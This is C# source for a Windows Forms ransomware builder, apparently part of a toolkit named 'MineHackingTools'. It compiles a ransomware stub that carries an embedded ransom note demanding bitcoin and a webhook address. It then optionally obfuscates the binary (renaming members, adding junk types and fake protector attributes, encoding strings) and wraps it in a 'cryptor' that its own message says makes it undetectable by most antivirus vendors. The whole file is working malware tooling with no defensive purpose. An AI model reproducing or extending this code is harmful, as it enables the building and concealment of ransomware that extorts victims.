using CryptoPrivacy;
using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Text;
using System.IO.Compression;
using dnlib.DotNet.Emit;
using dnlib.DotNet;

namespace MineHackingTools
{
    public partial class RansomwareBuildingForm : Form
    {
        public RansomwareBuildingForm()
        {
            InitializeComponent();
        }

        public string RandomPassword(int PasswordLength)
        {
            StringBuilder MakePassword = new StringBuilder();
            Random MakeRandom = new Random();
            while (0 < PasswordLength--)
            {
                string characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ*!@=&?&/abcdefghijklmnopqrstuvwxyz1234567890";
                MakePassword.Append(characters[MakeRandom.Next(characters.Length)]);
            }
            return MakePassword.ToString();
        }

        public string RandomName(int NameLength)
        {
            StringBuilder MakePassword = new StringBuilder();
            Random MakeRandom = new Random();
            while (0 < NameLength--)
            {
                string characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
                MakePassword.Append(characters[MakeRandom.Next(characters.Length)]);
            }
            return MakePassword.ToString();
        }

        private void ObfuscasteCode(string ToProtect)
        {
            ModuleContext ModuleCont = ModuleDefMD.CreateModuleContext();
            ModuleDefMD FileModule = ModuleDefMD.Load(ToProtect, ModuleCont);
            for (int i = 200; i < 300; i++)
            {
                InterfaceImpl Interface = new InterfaceImplUser(FileModule.GlobalType);
                TypeDef typedef = new TypeDefUser("", $"Form{i.ToString()}", FileModule.CorLibTypes.GetTypeRef("System", "Attribute"));
                InterfaceImpl interface1 = new InterfaceImplUser(typedef);
                FileModule.Types.Add(typedef);
                typedef.Interfaces.Add(interface1);
                typedef.Interfaces.Add(Interface);
            }

            string[] FakeObfuscastionsAttributes = { "ConfusedByAttribute", "YanoAttribute", "NetGuard", "DotfuscatorAttribute", "BabelAttribute" };

            for (int i = 0; i < FakeObfuscastionsAttributes.Length; i++)
            {
                var FakeObfuscastionsAttribute = new TypeDefUser(FakeObfuscastionsAttributes[i], FileModule.CorLibTypes.Object.TypeDefOrRef);
                FileModule.Types.Add(FakeObfuscastionsAttribute);
            }

            foreach (TypeDef type in FileModule.Types)
            {
                FileModule.Name = RandomName(12);
                if (type.IsGlobalModuleType || type.IsRuntimeSpecialName || type.IsSpecialName || type.IsWindowsRuntime || type.IsInterface)
                {
                    continue;
                }
                else
                {
                    for (int i = 200; i < 300; i++)
                    {
                        foreach (PropertyDef property in type.Properties)
                        {
                            if (property.IsRuntimeSpecialName) continue;
                            property.Name = RandomName(20) + i + RandomName(10) + i;
                        }
                        foreach (FieldDef fields in type.Fields)
                        {
                            fields.Name = RandomName(20) + i + RandomName(10) + i;
                        }
                        foreach (EventDef eventdef in type.Events)
                        {
                            eventdef.Name = RandomName(20) + i + RandomName(10) + i;
                        }
                        foreach (MethodDef method in type.Methods)
                        {
                            if (method.IsConstructor || method.IsRuntimeSpecialName || method.IsRuntime || method.IsStaticConstructor || method.IsVirtual) continue;
                            method.Name = RandomName(20) + i + RandomName(10) + i;
                        }
                    }
                }
            }

            foreach (TypeDef type in FileModule.Types)
            {
                foreach (MethodDef GetMethods in type.Methods)
                {
                    for (int i = 200; i < 300; i++)
                    {
                        if (GetMethods.IsConstructor || GetMethods.IsRuntimeSpecialName || GetMethods.IsRuntime || GetMethods.IsStaticConstructor) continue;
                        GetMethods.Name = RandomName(15) + i;
                    }
                }
            }

            for (int i = 0; i < 200; i++)
            {
                var Junk = new TypeDefUser(RandomName(10) + i + RandomName(10) + i + RandomName(10) + i, FileModule.CorLibTypes.Object.TypeDefOrRef);
                FileModule.Types.Add(Junk);
            }

            foreach (TypeDef type in FileModule.Types)
            {
                foreach (MethodDef method in type.Methods)
                {
                    if (method.Body == null) continue;
                    method.Body.SimplifyBranches();
                    for (int i = 0; i < method.Body.Instructions.Count; i++)
                    {
                        if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                        {
                            string EncodedString = method.Body.Instructions[i].Operand.ToString();
                            string InsertEncodedString = Convert.ToBase64String(UTF8Encoding.UTF8.GetBytes(EncodedString));
                            method.Body.Instructions[i].OpCode = OpCodes.Nop;
                            method.Body.Instructions.Insert(i + 1, new Instruction(OpCodes.Call, FileModule.Import(typeof(System.Text.Encoding).GetMethod("get_UTF8", new Type[] { }))));
                            method.Body.Instructions.Insert(i + 2, new Instruction(OpCodes.Ldstr, InsertEncodedString));
                            method.Body.Instructions.Insert(i + 3, new Instruction(OpCodes.Call, FileModule.Import(typeof(System.Convert).GetMethod("FromBase64String", new Type[] { typeof(string) }))));
                            method.Body.Instructions.Insert(i + 4, new Instruction(OpCodes.Callvirt, FileModule.Import(typeof(System.Text.Encoding).GetMethod("GetString", new Type[] { typeof(byte[]) }))));
                            i += 4;
                        }
                    }
                }
            }

            if (Directory.Exists(Environment.CurrentDirectory + @"\JunkData") == false)
            {
                Directory.CreateDirectory(Environment.CurrentDirectory + @"\JunkData");
                File.Move(Environment.CurrentDirectory + @"\Done.tmp", Environment.CurrentDirectory + @"\JunkData\" + RandomName(5) + ".exe");
            }
            else
            {
                File.Move(Environment.CurrentDirectory + @"\Done.tmp", Environment.CurrentDirectory + @"\JunkData\" + RandomName(5) + ".tmp");
            }

            FileModule.Write(Environment.CurrentDirectory + @"\Done.tmp");
        }

        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                AesAlgorithms Encryption = new AesAlgorithms();
                string Code = Resource1.Stub;
                string NewCode = Code.Replace("7tmhIB7XTfrsfP9BDl95sF2ufRW7zQchyyqmm5XcASPPKeUJjfll3kzbNpmQE5PU", Encryption.AesTextEncryption(textBox3.Text, "XRhvKhXPXCc45e!gDQg/6Xx0", "IGMxxL6&pT=CuU@B")).Replace("zWgB6bYi4CbRDIK/Gujd8w==", Encryption.AesTextEncryption(textBox1.Text, "Em1PILBo*YUAUEDuD7j&LT&W", "ddJqve&Wy0!DnL!V"));
                string TotallyNewCode = NewCode.Replace("TheWebHookHere", Encryption.AesTextEncryption(textBox2.Text, "KYW@lSFbp94&twDeTaOxR=MW", "RblWY7pnsIhv&D?a"));
                var Options = new Dictionary<string, string>();
                Options.Add("CompilerVersion", "v4.0");
                Options.Add("language", "c#");
                var codeProvider = new CSharpCodeProvider(Options);
                CompilerParameters parameters = new CompilerParameters();
                parameters.CompilerOptions = "/target:winexe";
                parameters.GenerateExecutable = true;
                parameters.OutputAssembly = "Done.tmp";
                parameters.IncludeDebugInformation = false;
                string[] Librarys = { "System", "System.Windows.Forms", "System.Management", "System.Net", "System.Core", "System.Net.Http", "System.Runtime", "System.Runtime.InteropServices" };
                foreach (string Library in Librarys)
                {
                    parameters.ReferencedAssemblies.Add(Library + ".dll");
                }
                codeProvider.CompileAssemblyFromSource(parameters, TotallyNewCode);

                if(checkBox1.Checked == true)
                {
                    ObfuscasteCode(Environment.CurrentDirectory + @"\Done.tmp");
                }

                if (checkBox2.Checked == true)
                {
                    byte[] CodeToProtect = File.ReadAllBytes(Environment.CurrentDirectory + @"\Done.tmp");
                    string RandomIV = RandomPassword(16);
                    string RandomKey = RandomPassword(40);
                    string Final = Encryption.AesTextEncryption(Convert.ToBase64String(CodeToProtect), RandomKey, RandomIV);
                    string MineCryptorCode = Resource1.MineCryptor;
                    string NewCrypterCode = MineCryptorCode.Replace("LLXls", Final).Replace("XOSa", RandomKey).Replace("OIXAS", RandomIV).Replace("FrzXRrIAvCIqEha", "namespace " + RandomName(14));
                    codeProvider.CompileAssemblyFromSource(parameters, NewCrypterCode);
                    Task.Delay(1000).Wait();
                }

                File.Move(Environment.CurrentDirectory + @"\Done.tmp", Environment.CurrentDirectory + @"\Done.exe");
                MessageBox.Show("Done, the file saved to current directory.", "Done", MessageBoxButtons.OKCancel, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error: " + ex.Message, "Error", MessageBoxButtons.OKCancel, MessageBoxIcon.Error);
            }
        }

        private void RansomwareBuildingForm_Load(object sender, EventArgs e)
        {
            textBox3.Text = "Hi, all of your files have been encrypted, if you wanna get your files back contact that bitcoin address: 123456, you can send one file to test the decryption.";
        }

        private void label7_Click(object sender, EventArgs e)
        {

        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            if(checkBox2.Checked == true)
            {
                MessageBox.Show("This Cryptor are just to make it undetectable for most AV Vendors, and it's not designed to be hard to unpack.", "Note", MessageBoxButtons.OKCancel, MessageBoxIcon.Information);
            }
        }
    }
}